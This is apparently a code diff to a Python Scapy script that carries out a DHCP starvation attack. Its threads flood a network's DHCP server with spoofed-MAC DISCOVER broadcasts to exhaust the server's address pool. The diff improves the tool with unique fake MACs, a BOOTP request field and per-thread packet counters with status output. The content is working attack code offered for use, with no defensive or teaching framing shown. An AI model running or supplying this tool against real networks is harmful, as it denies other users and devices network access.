@@ -36,10 +36,11 @@ def generate_unique_hostname():
 
 def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, duration=60):
     def starvation_thread():
+        packet_counter = 0;
         end_time = time.time() + duration
         while time.time() < end_time:
             # Generate random fake MAC and hostname for each request
-            mac = generate_random_mac()
+            mac = generate_unique_mac()
             hostname = generate_unique_hostname()
 
             # This packet is used to flood the legitimate DHCP server
@@ -73,7 +74,7 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
             dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
-                           BOOTP(chaddr=mac2str(mac), xid=randint(1, 0xFFFFFFFF)) / \
+                           BOOTP(op = 1,chaddr=mac2str(mac), xid=randint(1, 0xFFFFFFFF)) / \
                            DHCP(options=[("message-type", "discover"),  # sets packet[DHCP].options[0][1] = 1
                                         ("client_id", mac),
                                         ("hostname", hostname),
@@ -82,6 +83,10 @@ def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, dur
             
             # Send the packet
             sendp(dhcp_discover, iface=interface, verbose=0) # via Scapy
+            packet_counter += 1
+            if packet_counter % 500 == 0:  # Print status every 500 packets
+                print(f"[*] Thread-{threading.current_thread().name} sent {packet_counter} packets")
+
             time.sleep(0.001)  # Small delay to avoid overwhelming the system
 
     # Threads to perform the DHCP starvation attack parallelly
